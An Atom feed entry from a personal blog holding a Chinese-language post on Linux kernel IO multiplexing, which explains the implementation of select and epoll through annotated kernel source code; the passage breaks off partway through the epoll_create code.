<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Utop&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://DorMOUSE-None.github.io/"/>
  <updated>2019-03-05T00:58:05.350Z</updated>
  <id>https://DorMOUSE-None.github.io/</id>
  
  <author>
    <name>Utop</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>理解 Linux Kernel (9) - IO Multiplexing</title>
    <link href="https://DorMOUSE-None.github.io/2019-03-05-understand-Kernel-9/"/>
    <id>https://DorMOUSE-None.github.io/2019-03-05-understand-Kernel-9/</id>
    <published>2019-03-04T16:00:00.000Z</published>
    <updated>2019-03-05T00:58:05.350Z</updated>
    
    <content type="html"><![CDATA[<p><a href="./2019-01-15-understand-Kernel-8/">前一篇</a>已经对 Linux 内核网络相关的内容进行了基础性的介绍。数据从到达网卡，到最终被用户进程获取，最少经过了三个进程/硬中断的配合：网络中断负责将网络接收到的数据读取到内存并添加到 softnet_data 队列，并设置软中断通知内核进程 ksoftirqd；内核进程 ksoftirqd 被调度并处于运行状态，处理位于 softnet_data 中的 <code>struct sock</code> 对象，将其逐级从网络接口层逐级提升到网络层、传输层…最终添加到接收队列 <code>sk_receive_queue</code> 中；用户进程通过 <code>read</code>、<code>recv</code>、<code>recvfrom</code> 等命令检查并获取 <code>sk_receive_queue</code> 中的数据。</p><p>整个流程从概述上可以很轻松地配合进行网络数据交互，但如果要监控多个网络套接字呢？处理流程将变得复杂。我们无法预知哪个套接字能优先接收到数据。因此，最直接的办法就是轮询，在用户程序硬编码，通过设置超时时间的方式尝试获取数据。当然，这个效率就相当低下了。每次试探都需要触发系统调用（要知道这代价可是相当大的），另外超时时间的设置也是一个硬性的阻塞式消耗。</p><p>那么，有没有解决方案呢？当然有。通过用户程序硬编码式的轮询显然是陷入性能瓶颈的根源。因此内核主动提供了轮询式的系统调用（<code>select</code>, <code>poll</code>, <code>epoll</code>）。通过将轮询逻辑下沉到内核态，系统调用就只会有一次，而且超时时间的设置也显得统一。本篇就要就 <code>select</code> 和 <code>epoll</code> 两类系统调用的实现进行探究。</p><a id="more"></a><h2 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h2><p><code>select</code> 是一种比较古老的系统调用方式，存在着许多的调用限制。当然，相对的也就比较容易理解。</p><p><code>select</code> 系统调用最初的逻辑就是对超时时间的相关操作，完成从用户数据段到内核数据段的数据拷贝工作，而使用 <code>copy_from_user</code> 的目的，虽然看似比较晦涩，不如大家在用户程序中普通调用的memcpy，但究其原因，是为了处理MMU相关的问题。将内核复制的数据timeval做一定的取整操作（因为硬件中断的精度可能达不到timeval所描述的粒度，故根据HZ做取整，恰好为时钟中断周期的整数倍）。调用 <code>core_sys_select</code> 进行真正的轮询操作（当然，好像也算不上真正的逻辑，还有一层核心的调用呢）。结束后的操作当然是准备更新timeval。因为进行轮询的结果有两种，一种是因为超时而结束 <code>core_sys_select</code> 函数调用；另一种是得到了一个或多个准备就绪的数据，才结束调用并返回。显然，因为第二种结果而更新timeval有着一定的实际意义——到底等待了多久。不过这里需要注意的是，不是所有的Linux系统都支持对timeval做更新。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_select</span><span class="params">(<span class="keyword">int</span> n, fd_set __user *inp, fd_set __user *outp,</span></span></span><br><span class="line"><span class="function"><span class="params">fd_set __user *<span class="built_in">exp</span>, struct timeval __user *tvp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s64 timeout = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果设置了超时时间 */</span></span><br><span class="line"><span class="keyword">if</span> (tvp) &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;tv, tvp, <span class="keyword">sizeof</span>(tv)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 计时器不能设置为负数 */</span></span><br><span class="line"><span class="keyword">if</span> (tv.tv_sec &lt; <span class="number">0</span> || tv.tv_usec &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Cast to u64 to make GCC stop complaining */</span></span><br><span class="line">        <span class="comment">/* 对 timeout 做一定的处理，根据时钟周期对 usec 进行取整 */</span></span><br><span class="line"><span class="keyword">if</span> ((u64)tv.tv_sec &gt;= (u64)MAX_INT64_SECONDS)</span><br><span class="line">timeout = <span class="number">-1</span>;<span class="comment">/* 无限等待 */</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">timeout = DIV_ROUND_UP(tv.tv_usec, USEC_PER_SEC/HZ);</span><br><span class="line">timeout += tv.tv_sec * HZ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 核心的 select 实现逻辑 */</span></span><br><span class="line">ret = core_sys_select(n, inp, outp, <span class="built_in">exp</span>, &amp;timeout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果设置了超时时间 */</span></span><br><span class="line"><span class="keyword">if</span> (tvp) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">rtv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (current-&gt;personality &amp; STICKY_TIMEOUTS)</span><br><span class="line"><span class="keyword">goto</span> sticky;</span><br><span class="line">rtv.tv_usec = jiffies_to_usecs(do_div((*(u64*)&amp;timeout), HZ));</span><br><span class="line">rtv.tv_sec = timeout;</span><br><span class="line"><span class="keyword">if</span> (timeval_compare(&amp;rtv, &amp;tv) &gt;= <span class="number">0</span>)</span><br><span class="line">rtv = tv;</span><br><span class="line">        <span class="comment">/* 内核数据-&gt;用户数据的拷贝，更新距离超时剩余的时间间隔 */</span></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(tvp, &amp;rtv, <span class="keyword">sizeof</span>(rtv))) &#123;</span><br><span class="line">sticky:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果应用程序把timeval放在只读内存中，内核就无需特别的更新它</span></span><br><span class="line"><span class="comment"> * If an application puts its timeval in read-only</span></span><br><span class="line"><span class="comment"> * memory, we don't want the Linux-specific update to</span></span><br><span class="line"><span class="comment"> * the timeval to cause a fault after the select has</span></span><br><span class="line"><span class="comment"> * completed successfully. However, because we're not</span></span><br><span class="line"><span class="comment"> * updating the timeval, we can't restart the system</span></span><br><span class="line"><span class="comment"> * call.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ret == -ERESTARTNOHAND)</span><br><span class="line">ret = -EINTR;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>core_sys_select</code> 也没有太多核心操作，完全是在为三个位图——输入、输出、错误从用户数据段到内核数据段的拷贝工作，以及在结束 <code>do_select</code> 调用后的反向拷贝操作。不过，无论是 <code>sys_select</code> 还是 <code>core_sys_select</code> 都将各自需要完成的工作分割得非常清晰，一个完成timeval的处理工作，另一个完成位图的处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 内核数据-位图的准备，调用do_select完成核心的逻辑</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">core_sys_select</span><span class="params">(<span class="keyword">int</span> n, fd_set __user *inp, fd_set __user *outp,</span></span></span><br><span class="line"><span class="function"><span class="params">   fd_set __user *<span class="built_in">exp</span>, s64 *timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">fd_set_bits fds;</span><br><span class="line"><span class="keyword">void</span> *bits;</span><br><span class="line"><span class="keyword">int</span> ret, max_fds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在栈中定义较小的数组，减少堆内存的占用，同时可以更快；</span></span><br><span class="line"><span class="comment">     * SELECT_STACK_ALLOC = 256</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">long</span> stack_fds[SELECT_STACK_ALLOC/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_nofds;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* max_fds can increase, so grab it once to avoid race */</span></span><br><span class="line">    <span class="comment">/* max_fds 可能同时在增加，所以提前获取一份固定的拷贝避免竞争 */</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">    <span class="comment">/* 获取当前任务的文件描述符表 */</span></span><br><span class="line">fdt = files_fdtable(current-&gt;files);</span><br><span class="line">max_fds = fdt-&gt;max_fds;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (n &gt; max_fds)</span><br><span class="line">n = max_fds;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need 6 bitmaps (in/out/ex for both incoming and outgoing),</span></span><br><span class="line"><span class="comment"> * since we used fdset we need to allocate memory in units of</span></span><br><span class="line"><span class="comment"> * long-words.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">size = FDS_BYTES(n);</span><br><span class="line">bits = stack_fds;</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="keyword">sizeof</span>(stack_fds) / <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Not enough space in on-stack array; must use kmalloc */</span></span><br><span class="line">        <span class="comment">/* 栈数组大小不足；使用 kmalloc 获取新的空间 */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">bits = kmalloc(<span class="number">6</span> * size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!bits)</span><br><span class="line"><span class="keyword">goto</span> out_nofds;</span><br><span class="line">&#125;</span><br><span class="line">fds.in      = bits;</span><br><span class="line">fds.out     = bits +   size;</span><br><span class="line">fds.ex      = bits + <span class="number">2</span>*size;</span><br><span class="line">fds.res_in  = bits + <span class="number">3</span>*size;</span><br><span class="line">fds.res_out = bits + <span class="number">4</span>*size;</span><br><span class="line">fds.res_ex  = bits + <span class="number">5</span>*size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 用户数据段的数据 inp、outp、exp 往内核数据段 fds.xxx 拷贝 */</span></span><br><span class="line"><span class="keyword">if</span> ((ret = get_fd_set(n, inp, fds.in)) ||</span><br><span class="line">    (ret = get_fd_set(n, outp, fds.out)) ||</span><br><span class="line">    (ret = get_fd_set(n, <span class="built_in">exp</span>, fds.ex)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* fds.res_xxx 作为 do_select 的执行结果，预置为0，表示每一位相应的fd都未准备就绪 */</span></span><br><span class="line">zero_fd_set(n, fds.res_in);</span><br><span class="line">zero_fd_set(n, fds.res_out);</span><br><span class="line">zero_fd_set(n, fds.res_ex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 交由 do_select 完成真正核心的操作 */</span></span><br><span class="line">ret = do_select(n, &amp;fds, timeout);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">ret = -ERESTARTNOHAND;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将结果集拷贝回用户数据段的 inp、outp、exp 中 */</span></span><br><span class="line"><span class="keyword">if</span> (set_fd_set(n, inp, fds.res_in) ||</span><br><span class="line">    set_fd_set(n, outp, fds.res_out) ||</span><br><span class="line">    set_fd_set(n, <span class="built_in">exp</span>, fds.res_ex))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (bits != stack_fds)</span><br><span class="line">kfree(bits);</span><br><span class="line">out_nofds:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终于是核心的逻辑了，逐一地将当前任务挂到相应文件的等待队列上，并等待调用 <code>poll</code> 函数被唤醒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_select</span><span class="params">(<span class="keyword">int</span> n, fd_set_bits *fds, s64 *timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_wqueues</span> <span class="title">table</span>;</span></span><br><span class="line">poll_table *wait;</span><br><span class="line"><span class="keyword">int</span> retval, i;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">    <span class="comment">/* 确认fds.xxx所需轮询的fd全部全部处于打开状态，同时返回最大的fd */</span></span><br><span class="line">retval = max_select_fd(n, fds);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">n = retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 把当前任务放入自己的等待队列中 */</span></span><br><span class="line">poll_initwait(&amp;table);</span><br><span class="line">wait = &amp;table.pt;</span><br><span class="line">    <span class="comment">/* 如果超时时间为0，即无需等待 */</span></span><br><span class="line"><span class="keyword">if</span> (!*timeout)</span><br><span class="line">wait = <span class="literal">NULL</span>;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 无限循环 */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rinp, *routp, *rexp, *inp, *outp, *<span class="built_in">exp</span>;</span><br><span class="line"><span class="keyword">long</span> __timeout;</span><br><span class="line"></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">inp = fds-&gt;in; outp = fds-&gt;out; <span class="built_in">exp</span> = fds-&gt;ex;</span><br><span class="line">rinp = fds-&gt;res_in; routp = fds-&gt;res_out; rexp = fds-&gt;res_ex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; ++rinp, ++routp, ++rexp) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> in, out, ex, all_bits, bit = <span class="number">1</span>, mask, j;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> res_in = <span class="number">0</span>, res_out = <span class="number">0</span>, res_ex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">in = *inp++; out = *outp++; ex = *<span class="built_in">exp</span>++;</span><br><span class="line">all_bits = in | out | ex;</span><br><span class="line"><span class="keyword">if</span> (all_bits == <span class="number">0</span>) &#123;</span><br><span class="line">i += __NFDBITS;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对 unsigned long 的每一位进行确认 */</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; __NFDBITS; ++j, ++i, bit &lt;&lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> fput_needed;</span><br><span class="line">                <span class="comment">/* 超过需检测的最大的文件描述符 */</span></span><br><span class="line"><span class="keyword">if</span> (i &gt;= n)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">/* 该 fd 无需检测，直接下一个 */</span></span><br><span class="line"><span class="keyword">if</span> (!(bit &amp; all_bits))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">/* 获取相应的文件实例 */</span></span><br><span class="line">file = fget_light(i, &amp;fput_needed);</span><br><span class="line"><span class="keyword">if</span> (file) &#123;</span><br><span class="line">f_op = file-&gt;f_op;</span><br><span class="line">mask = DEFAULT_POLLMASK;</span><br><span class="line">                    <span class="comment">/* 对于套接字，调用的是sock_poll，在poll成功时将唤醒wait队列的任务（即把当前任务唤醒）*/</span></span><br><span class="line"><span class="keyword">if</span> (f_op &amp;&amp; f_op-&gt;poll)</span><br><span class="line">mask = (*f_op-&gt;poll)(file, retval ? <span class="literal">NULL</span> : wait);</span><br><span class="line">fput_light(file, fput_needed);</span><br><span class="line"><span class="keyword">if</span> ((mask &amp; POLLIN_SET) &amp;&amp; (in &amp; bit)) &#123;</span><br><span class="line">res_in |= bit;</span><br><span class="line">retval++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((mask &amp; POLLOUT_SET) &amp;&amp; (out &amp; bit)) &#123;</span><br><span class="line">res_out |= bit;</span><br><span class="line">retval++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((mask &amp; POLLEX_SET) &amp;&amp; (ex &amp; bit)) &#123;</span><br><span class="line">res_ex |= bit;</span><br><span class="line">retval++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">                <span class="comment">/* 主动让出CPU片，等待重新调度（提前设置了最高优先级PREEMPT_ACTIVE）*/</span></span><br><span class="line">cond_resched();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (res_in)</span><br><span class="line">*rinp = res_in;</span><br><span class="line"><span class="keyword">if</span> (res_out)</span><br><span class="line">*routp = res_out;</span><br><span class="line"><span class="keyword">if</span> (res_ex)</span><br><span class="line">*rexp = res_ex;</span><br><span class="line">&#125;</span><br><span class="line">wait = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (retval || !*timeout || signal_pending(current))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span>(table.error) &#123;</span><br><span class="line">retval = table.error;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*timeout &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Wait indefinitely */</span></span><br><span class="line">__timeout = MAX_SCHEDULE_TIMEOUT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(*timeout &gt;= (s64)MAX_SCHEDULE_TIMEOUT - <span class="number">1</span>)) &#123;</span><br><span class="line"><span class="comment">/* Wait for longer than MAX_SCHEDULE_TIMEOUT. Do it in a loop */</span></span><br><span class="line">__timeout = MAX_SCHEDULE_TIMEOUT - <span class="number">1</span>;</span><br><span class="line">*timeout -= __timeout;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">__timeout = *timeout;</span><br><span class="line">*timeout = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">/* 进入延时唤醒状态，待定预定的超时时间 */</span></span><br><span class="line">__timeout = schedule_timeout(__timeout);</span><br><span class="line"><span class="keyword">if</span> (*timeout &gt;= <span class="number">0</span>)</span><br><span class="line">*timeout += __timeout;</span><br><span class="line">&#125;</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">poll_freewait(&amp;table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结来看，<code>select</code> 完全能够支持IO多路复用。至少比用户程序自行实现轮询优秀得多。但是，也存在着一些明显的缺陷：</p><ol><li>支持的文件描述符存在上限，默认是1024。</li><li>每次陷入内核态 <code>select</code> 函数之后，都需要按位遍历所有的文件描述符（无论该fd是否存在），max(fd)越大，开销越大。</li><li>每次调用 <code>select</code> 都需要将fd集合从用户态复制到内核态，max(fd)越大，开销越大。</li></ol><h2 id="EPOLL"><a href="#EPOLL" class="headerlink" title="EPOLL"></a>EPOLL</h2><p>简单地描述过 <code>select</code> 系统调用之后，我们着重来聊一聊 <code>epoll</code> 的实现。毕竟 <code>select</code> 和 <code>poll</code> 的复杂度是 $O(N)$，而 <code>epoll</code> 只是 $O(\log{N})$ （当然，这里对时间复杂度的比较维度不同，稍候细讲）。<code>epoll</code> 区别于传统I/O复用模型的最大特色在于：它将创建并维护一个 <code>eventpoll</code> 实例，并通过注册请 <code>epoll</code> 对新的文件描述符进行监听，这意味着数据从用户数据区到内核数据区的拷贝只有一次；相对的，传统方式在每次轮询时，都需要全量地将数据从用户数据区拷贝到内核数据区。 </p><h3 id="epoll-create"><a href="#epoll-create" class="headerlink" title="epoll_create"></a><code>epoll_create</code></h3><p><code>epoll_create</code> 负责创建一个新的 <code>eventpoll</code> 实例。这里的size并没有实际意义（由于历史原因而存在），传入的参数将被忽略。看源码总是件有意思的事，这个size被描述成了检查精神健全的标志…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error, fd = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">DNPRINTK(<span class="number">3</span>, (KERN_INFO <span class="string">"[%p] eventpoll: sys_epoll_create(%d)\n"</span>,</span><br><span class="line">     current, size));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 精神健全检测(size)；同时建立内部数据结构 struct eventpoll</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">0</span> || (error = ep_alloc(&amp;ep)) != <span class="number">0</span>)</span><br><span class="line"><span 